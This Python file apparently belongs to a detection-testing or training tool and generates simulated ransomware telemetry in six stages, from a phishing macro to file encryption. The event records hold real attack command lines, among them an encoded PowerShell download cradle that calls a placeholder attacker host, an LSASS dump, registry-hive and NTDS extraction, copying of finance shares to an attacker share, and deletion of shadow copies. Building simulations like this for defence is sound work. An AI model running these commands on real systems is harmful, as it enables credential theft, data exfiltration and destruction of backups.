"""
Scenario 3: Ransomware / Data Exfiltration Attack
Based on real-world ransomware patterns (Conti/LockBit/BlackCat style)
— Distinct IP range and TTPs from Scenarios 1 & 2
"""
from .scenario_base import AttackScenario


class RansomwareScenario(AttackScenario):
    def __init__(self):
        super().__init__(
            name="Ransomware Attack (Conti/LockBit Pattern)",
            description="Simulated ransomware attack chain: phishing entry -> C2 beacon -> "
                        "credential dumping -> lateral spread -> data exfil -> ransomware deployment",
            scenario_type="ransomware"
        )
        self.attacker_c2 = "203.0.113.50"           # Ransomware C2 (TEST-NET-3 range)
        self.phishing_host = "203.0.113.51"          # Phishing infrastructure
        self.victim_workstation = "172.16.50.100"    # Initial victim endpoint
        self.file_server = "172.16.50.10"            # File server (lateral target)
        self.domain_controller = "172.16.50.1"       # Domain controller (credential target)
        self.backup_server = "172.16.50.20"          # Backup server (destruction target)

    def generate_attack_sequence(self) -> list[dict]:
        stages = []

        # Stage 1: Initial Access — Spear-phishing
        stages.append({
            "type": "stage",
            "name": "Stage 1: Initial Access (T1566.001 — Spear-phishing Attachment)",
            "description": "User opens malicious invoice document, macro executes download cradle",
            "events": [
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "WINWORD.EXE", "pid": 4500, "parent_pid": 1200,
                              "parent_process": "explorer.exe",
                              "command_line": "WINWORD.EXE /q /t\"C:\\Users\\victim\\Downloads\\Invoice_URGENT.docm\""},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "powershell.exe", "pid": 4510, "parent_pid": 4500,
                              "parent_process": "WINWORD.EXE",
                              "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQExADMALgA1ADEAOgA4ADAAOAAwAC8AcwB0AGEAZwBlADEALgBiAGkAbgAnACkA"},
                    features={"is_abnormal_parent": True, "is_suspicious_cmd": True}),
                self._make_event("network_traffic", self.victim_workstation, "network_flow",
                    entities={"src_ip": self.victim_workstation, "dst_ip": self.attacker_c2, "domain": "cdn-update-security.com"},
                    extra={"src_ip": self.victim_workstation, "dst_ip": self.attacker_c2, "dst_port": 8080, "protocol": "HTTP", "packet_length": 450000}),
            ]
        })

        # Stage 2: Execution & C2 Beacon
        stages.append({
            "type": "stage",
            "name": "Stage 2: Execution & C2 Beacon (T1059.001 / T1071.001)",
            "description": "Downloaded payload establishes persistence and C2 beacon",
            "events": [
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "rundll32.exe", "pid": 4600, "parent_pid": 4510,
                              "parent_process": "powershell.exe",
                              "command_line": "rundll32.exe C:\\Users\\Public\\svchost.dat,Start"},
                    features={"is_abnormal_parent": True}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "vssadmin.exe", "pid": 4610, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "vssadmin.exe delete shadows /all /quiet"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("network_traffic", self.victim_workstation, "network_flow",
                    entities={"src_ip": self.victim_workstation, "dst_ip": self.attacker_c2},
                    extra={"src_ip": self.victim_workstation, "dst_ip": self.attacker_c2, "dst_port": 443, "protocol": "HTTPS"}),
                self._make_event("host_behavior", self.victim_workstation, "registry_set_value",
                    entities={"process_name": "rundll32.exe", "pid": 4600,
                              "registry_key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
                              "registry_value": "C:\\Users\\Public\\svchost.dat"},
                    features={"is_persistence": True}),
            ]
        })

        # Stage 3: Credential Access
        stages.append({
            "type": "stage",
            "name": "Stage 3: Credential Access (T1003.001 — LSASS Dump)",
            "description": "Attacker dumps LSASS and SAM for credential harvesting",
            "events": [
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "taskmgr.exe", "pid": 4700, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"},
                    features={"is_sensitive_path": True, "is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "reg.exe", "pid": 4710, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive"},
                    features={"is_sensitive_path": True}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "reg.exe", "pid": 4720, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hive"},
                    features={"is_sensitive_path": True}),
            ]
        })

        # Stage 4: Discovery
        stages.append({
            "type": "stage",
            "name": "Stage 4: Discovery (T1082 / T1046 / T1018)",
            "description": "Network and system discovery for lateral movement targets",
            "events": [
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "net.exe", "pid": 4800, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "net view /domain"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "nltest.exe", "pid": 4810, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "nltest /dclist:corp.local"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("network_traffic", self.victim_workstation, "port_scan",
                    entities={"src_ip": self.victim_workstation, "dst_ip": "172.16.50.0/24", "scan_type": "SYN scan"},
                    extra={"src_ip": self.victim_workstation, "dst_ip": self.file_server, "dst_port": 445, "protocol": "TCP"}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "whoami.exe", "pid": 4820, "parent_pid": 4600,
                              "parent_process": "rundll32.exe", "command_line": "whoami /all"},
                    features={"is_suspicious_cmd": True}),
            ]
        })

        # Stage 5: Lateral Movement + Data Exfiltration
        stages.append({
            "type": "stage",
            "name": "Stage 5: Lateral Movement (T1021.002 / T1570) + Data Exfil (T1041)",
            "description": "SMB lateral movement to file server, data exfiltration to C2",
            "events": [
                self._make_event("host_log", self.file_server, "user_logon",
                    entities={"user": "CORP\\svc-backup", "src_ip": self.victim_workstation, "session_id": "smb-001"}),
                self._make_event("host_behavior", self.file_server, "process_create",
                    entities={"process_name": "cmd.exe", "pid": 5000, "parent_pid": 500,
                              "parent_process": "smbd",
                              "command_line": "cmd.exe /c copy C:\\Shares\\Finance\\* \\\\203.0.113.50\\exfil\\"},
                    features={"is_abnormal_parent": True}),
                self._make_event("network_traffic", self.file_server, "data_exfiltration",
                    entities={"src_ip": self.file_server, "dst_ip": self.attacker_c2, "file_name": "Finance_2026.zip", "file_size": 125829120},
                    extra={"src_ip": self.file_server, "dst_ip": self.attacker_c2, "dst_port": 443, "protocol": "HTTPS", "packet_length": 65000, "event_type": "data_exfiltration"}),
                self._make_event("host_behavior", self.domain_controller, "process_create",
                    entities={"process_name": "ntdsutil.exe", "pid": 5100, "parent_pid": 500,
                              "parent_process": "svchost.exe",
                              "command_line": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds\" q q"},
                    features={"is_abnormal_parent": True, "is_sensitive_path": True}),
            ]
        })

        # Stage 6: Impact — Ransomware Deployment
        stages.append({
            "type": "stage",
            "name": "Stage 6: Impact (T1486 — Data Encrypted for Impact)",
            "description": "Ransomware encrypts files, drops ransom note, deletes backups",
            "events": [
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "vssadmin.exe", "pid": 5200, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "vssadmin.exe delete shadows /all /quiet"},
                    features={"is_suspicious_cmd": True}),
                self._make_event("host_behavior", self.victim_workstation, "file_create",
                    entities={"process_name": "encryptor.exe", "pid": 5210,
                              "file_path": "C:\\Users\\victim\\Desktop\\README_DECRYPT.txt"},
                    features={"is_suspicious_extension": True}),
                self._make_event("host_behavior", self.file_server, "file_modify",
                    entities={"process_name": "encryptor.exe", "pid": 5300,
                              "file_path": "C:\\Shares\\Finance\\budget_2026.xlsx.encrypted"},
                    features={"is_suspicious_extension": True}),
                self._make_event("network_traffic", self.victim_workstation, "network_flow",
                    entities={"src_ip": self.victim_workstation, "dst_ip": self.attacker_c2},
                    extra={"src_ip": self.victim_workstation, "dst_ip": self.attacker_c2, "dst_port": 443, "protocol": "HTTPS"}),
                self._make_event("host_behavior", self.victim_workstation, "process_create",
                    entities={"process_name": "bcdedit.exe", "pid": 5400, "parent_pid": 4600,
                              "parent_process": "rundll32.exe",
                              "command_line": "bcdedit /set {default} recoveryenabled No"},
                    features={"is_suspicious_cmd": True}),
            ]
        })

        return stages
